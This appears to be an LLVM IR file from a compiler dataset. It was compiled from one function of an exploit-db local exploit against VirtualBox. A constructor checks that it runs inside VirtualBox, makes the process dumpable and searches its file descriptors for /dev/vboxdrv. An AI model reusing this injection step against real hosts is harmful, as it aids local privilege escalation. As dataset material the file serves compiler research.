; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41907.c_run.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41907.c_run.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@program_invocation_short_name = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"VirtualBox\00", align 1
@PR_SET_DUMPABLE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"running in pid %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [61 x i8] c"searching for vboxdrv file descriptor in current process...\0A\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"/dev/vboxdrv\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"/proc/self/fd/%d\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"found it, fd %d is /dev/vboxdrv\0A\00", align 1
@llvm.global_ctors = appending global [1 x { i32, void ()*, i8* }] [{ i32, void ()*, i8* } { i32 65535, void ()* @run, i8* null }]

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @run() #0 {
  %1 = alloca [1000 x i8], align 16
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [1000 x i8], align 16
  %5 = alloca i32, align 4
  %6 = load i32, i32* @program_invocation_short_name, align 4
  %7 = call i64 @strcmp(i32 %6, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  %8 = icmp ne i64 %7, 0
  br i1 %8, label %9, label %10

9:                                                ; preds = %0
  ret void

10:                                               ; preds = %0
  %11 = load i32, i32* @PR_SET_DUMPABLE, align 4
  %12 = call i32 @prctl(i32 %11, i32 1)
  %13 = call i32 (...) @getpid()
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i32 %13)
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.2, i64 0, i64 0))
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0), i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %16

16:                                               ; preds = %45, %10
  %17 = load i32, i32* %3, align 4
  %18 = icmp slt i32 %17, 1000
  br i1 %18, label %19, label %48

19:                                               ; preds = %16
  %20 = getelementptr inbounds [1000 x i8], [1000 x i8]* %4, i64 0, i64 0
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @sprintf(i8* %20, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i32 %21)
  %23 = getelementptr inbounds [1000 x i8], [1000 x i8]* %4, i64 0, i64 0
  %24 = getelementptr inbounds [1000 x i8], [1000 x i8]* %1, i64 0, i64 0
  %25 = call i32 @readlink(i8* %23, i8* %24, i32 999)
  store i32 %25, i32* %5, align 4
  %26 = load i32, i32* %5, align 4
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %29

28:                                               ; preds = %19
  br label %45

29:                                               ; preds = %19
  %30 = load i32, i32* %5, align 4
  %31 = load i8*, i8** %2, align 8
  %32 = call i32 @strlen(i8* %31)
  %33 = icmp eq i32 %30, %32
  br i1 %33, label %34, label %44

34:                                               ; preds = %29
  %35 = getelementptr inbounds [1000 x i8], [1000 x i8]* %1, i64 0, i64 0
  %36 = load i8*, i8** %2, align 8
  %37 = load i8*, i8** %2, align 8
  %38 = call i32 @strlen(i8* %37)
  %39 = call i64 @memcmp(i8* %35, i8* %36, i32 %38)
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %41, label %44

41:                                               ; preds = %34
  %42 = load i32, i32* %3, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0), i32 %42)
  br label %44

44:                                               ; preds = %41, %34, %29
  br label %45

45:                                               ; preds = %44, %28
  %46 = load i32, i32* %3, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %3, align 4
  br label %16

48:                                               ; preds = %16
  %49 = call i32 @_exit(i32 0) #3
  unreachable
}

declare dso_local i64 @strcmp(i32, i8*) #1

declare dso_local i32 @prctl(i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @readlink(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @memcmp(i8*, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
